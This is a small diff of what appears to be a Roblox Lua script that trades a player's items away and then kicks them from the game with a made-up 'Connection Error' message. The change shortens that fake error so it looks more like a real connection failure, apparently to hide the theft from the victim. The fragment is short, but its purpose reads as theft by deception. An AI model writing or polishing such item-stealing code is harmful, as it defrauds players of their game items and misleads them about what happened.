@@ -311,7 +311,7 @@ if #itemsToSend > 0 then
             task.wait(0.5)
             confirmTrade()
         end
-        plr:kick("Connection Error: Operation Finished.")
+        plr:kick("Connection Error.")
     end
 
     local function waitForUserJoin()
